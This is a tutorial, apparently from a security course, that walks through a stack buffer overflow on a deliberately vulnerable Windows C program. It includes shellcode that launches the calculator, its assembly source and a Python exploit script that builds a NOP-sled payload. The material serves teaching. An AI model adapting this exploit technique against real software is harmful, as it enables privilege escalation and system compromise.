# Buffer overflow through command line argument

This is a demo of buffer overflow through a command line argument. The local buffer of a victim function has enough space to hold the shell code. 

The old password change tool *passwd* has a similar buffer oveflow to victim3.c in this post. The old *passwd* is a program with the root priviledge ([seuid](https://en.wikipedia.org/wiki/Setuid)). When an attacker feeds a malicious string that contains shellcode (malicious code snippet) into the old *passwd*, the shell code gets running and can change anything of the whole Linux systen since the shellcode inherits the root priviledge from the *passwd*.

### Overview

**Experiment setup**:
1. Windows 10 with all Exploit Protection disabled
2. [mingw-w64](http://mingw-w64.org/doku.php) installed
3. [nasm](https://www.nasm.us/) installed
4. [arwin](https://github.com/xinwenfu/arwin) installed
5. [Windows Sysinternals/listdlls](https://docs.microsoft.com/en-us/sysinternals/) installed

**victim3.c**: the victim C code with the vulnerable strcpy, which copies argv[1] into a buffer *char str[64]*. The buffer is large enough to hold our malcious string, which contains shellcode. 
```
// gcc -m32 -o victim3.exe victim3.c
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv) {
	char str[64];
	
	strcpy(str, argv[1]);

	return 0;
}
```

**calc-shell.asm**: the assembly code for shellcode, which pops up a caculator

**exploit.py**: In the python code exploit.py, we save the shell code and other necessary parts into an environment variable, and then open a command shell, which inherits all environment variables including the one we created. In the newly opened command shell, the environment variable is fed into a victim program as a command line argument, which causes the buffer overflow and pops up the calculator.

### Video demo

[![Video demo of attacking victim3.exe](https://img.youtube.com/vi/z1GMBSXHJH0/0.jpg)](https://youtu.be/z1GMBSXHJH0)


### Steps to run the example

#### Step 1. Get WinExec's address
```
c:\Workshop>arwin kernel32.dll WinExec
arwin - win32 address resolution program - by steve hanna - v.01
WinExec is located at 0x74fccd30 in kernel32.dll
```
WinExec is an API in kernel32.dll. We can use the tool arwin to get its address in the computer memory. One limitation of this example is we need to manually get the address of WinExec. Moreover, Windows may load the system dlls such as kernel32.dll at a different address every time Windows restarts. Therefore, we have to get the address of WinExec every time Windows restarts. There are smart ways to automatically get the address of WinExec automatically. But this example is kept simple so that you can see the principle of a buffer overflow attack.

#### Step 2. Create shellcode
Copy and paste the address of WinExec(.), derived from Step 1, into calc-shell.asm shown below at *mov eax, 7657cd30h*.
```
;Assemble: nasm.exe -f win32 calc-shell.asm -o calc-shell.obj
;LINK: GoLink.exe /console /entry _start calc-shell.obj
;IF THE obj FILE IS NOT CREATED WITH THE -f win32 GoLink will COMPLAIN
;Tested and coded on Win10

[BITS 32]

[SECTION .text]
global _start   ; declare entry point
_start:

;Put the string "calc.exe\0" onto the stack
xor ecx,ecx     ; ecx=0
push ecx        ; push \0 (null string terminator) onto the stack
push 0x6578652e ; .exe; little endian; 2e(.) is put at lower address
push 0x636c6163 ; calc; little endian

mov ecx,esp     ; esp points to "calc.exe\0"
push 0x1        ; window style
push ecx        ; first argument for WinExec

mov eax, 7657cd30h  ; 7657cd30h is address of WinExec; RVA=0x5dab0 within kernel32.dll; needs to be changed
call eax            ; WinExec("calc.exe\0",1)

;exit clean
;xor ecx, ecx   ; ecx=0
;push ecx       ; argument or ExitProcess
;mov eax, 769b4100h ; RVA=0x258f0; The address of ExitProcess may have the \0 byte! e.g. 0x74f94100
;call eax           ; ExitProcess(0)
```
Load calc-shell.exe into Immunity Debugger and then: Select the code (press mouse's left button and drag) -> Right Click -> Binary -> Binary Copy. Now we have the shellcode copied to the clipboard.

#### Step 3. Create a malicious string that contains the shellcode and more
Paste the shellcode into exploit.py shown below at the right place. exploit.py does three things 
* Creates the malicious string that will be fed into the victim program as the command line argument. The malicous string is composed as follows: *NOP sled Padding  || Shell code || NOP sled padding || Malicious code address*, where || means concatenaton. The shellcode shall be formated in the appropraite hexdecimal format. The malicious code address points to somewhere in the first NOP sled padding. How did I get The malcious code address and padding length? I just debugged victim3.exe with Immunity Debugger and find out the information. Really it is about where the local buffer is on the stack.
* Creates an environment variable called TEST holding the malicious string.
* Starts a command shell with cmd.exe. 

```
# python exploit.py

import os   # import os module

# Create the malicious string
shell=b"\x90"*26    # padding with nop; no change
# shellcode; change please
shell+=b"\x31\xC9\x51\x68\x2E\x65\x78\x65\x68\x63\x61\x6C\x63\x89\xE1\x6A\x01\x51\xB8\x30\xCD\xFC\x74\xFF\xD0" 
shell+=b"\x90"*25   # padding with nop; no change
shell+=b"\x94\xFE\x61" # address to overwrite return address; no change

os.environ['TEST'] = shell  # create environment variable holding the malicious string

os.system('cmd')    # start a command shell, inheriting TEST environment variable 
```

#### Step 4. Run exploit.py and feed victim3.exe with the malicious string
When the new command shell starts, it inherits the environment variable. We now run victim3.exe with the command line argument as the environment variable %TEST% and the calculator shall pop up.

```
c:\Workshop>exploit.py
Microsoft Windows [Version 10.0.19041.867]
(c) 2020 Microsoft Corporation. All rights reserved.

c:\Workshop>victim3 %TEST%
```
